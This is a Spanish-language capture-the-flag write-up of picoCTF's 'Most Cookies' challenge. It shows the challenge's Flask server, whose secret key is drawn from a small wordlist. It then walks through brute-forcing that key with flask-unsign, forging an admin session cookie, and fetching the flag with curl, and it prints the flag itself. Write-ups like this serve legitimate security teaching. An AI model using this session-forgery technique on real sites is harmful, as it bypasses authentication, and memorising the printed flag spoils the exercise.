## Reto: Most cookies
### Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py) [http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)
### Solución
Vemos que nos dirige a una liga y ademas nos da el siguiente `script`
```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session

import random

app = Flask(__name__)

flag_value = open("./flag").read().rstrip()

title = "Most Cookies"

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

app.secret_key = random.choice(cookie_names)

  

@app.route("/")

def main():

    if session.get("very_auth"):

        check = session["very_auth"]

        if check == "blank":

            return render_template("index.html", title=title)

        else:

            return make_response(redirect("/display"))

    else:

        resp = make_response(redirect("/"))

        session["very_auth"] = "blank"

        return resp

  

@app.route("/search", methods=["GET", "POST"])

def search():

    if "name" in request.form and request.form["name"] in cookie_names:

        resp = make_response(redirect("/display"))

        session["very_auth"] = request.form["name"]

        return resp

    else:

        message = "That doesn't appear to be a valid cookie."

        category = "danger"

        flash(message, category)

        resp = make_response(redirect("/"))

        session["very_auth"] = "blank"

        return resp

  

@app.route("/reset")

def reset():

    resp = make_response(redirect("/"))

    session.pop("very_auth", None)

    return resp

  

@app.route("/display", methods=["GET"])

def flag():

    if session.get("very_auth"):

        check = session["very_auth"]

        if check == "admin":

            resp = make_response(render_template("flag.html", value=flag_value, title=title))

            return resp

        flash("That is a cookie! Not very special though...", "success")

        return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])

    else:

        resp = make_response(redirect("/"))

        session["very_auth"] = "blank"

        return resp

  

if __name__ == "__main__":

    app.run()
```
Al entrar en la pagina que se nos es proporcionada, podemos notar que tenemos que ingresar un nombre de galleta y nos abrira un apartado donde nos dice el nombre de esa galleta.

Al entrar ahi podemos notar que se nos ha generado una `cookie`, por lo que procedemos a copiarla.

Después de instalar una serie de herramientas en la consola, ingresamos a un modo virtual para evitar dañar algo en el sistema operativo, por lo que la consola cambia el prompt.

Bien, ahora creamos un documento llamado `cookies.txt` donde guardaremos el nombre de cada una de esas galletas

```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```

Con el siguiente comando y la `cookie` generada, procedemos a encontrar la correcta
```shell
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-9rTA.gv0SG0WAQNvMMnoM6xP2WS6oilM" --wordlist cookies.txt
```
Ahora nos regresara el nombre de la galleta correcta:
```shell
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'gingersnap'
```

Como podemos ver la correcta es `gingersnap`
Ahora procedemos a obtener la nueva cookie,  la siguiente manera:
```shell
flask-unsign --sign --cookie '{"very_auth":"admin"}' --secret "gingersnap"
```
Y nos regresa la nueva cookie:
```
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-9rfg.AWd0fAPro9cLSf4Sl9etFLwUL18
```
Con el siguiente comando encontramos la bandera:
```shell
curl -s http://mercury.picoctf.net:6259/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-9rfg.AWd0fAPro9cLSf4Sl9etFLwUL18" | grep pico
```
El comando hace una petición como si fueras "admin" y busca si en la respuesta hay una flag
Y nos regresa la bandera
```flag
picoCTF{pwn_4ll_th3_cook1E5_5f016958}
```
### Notas adicionales
### Referencias

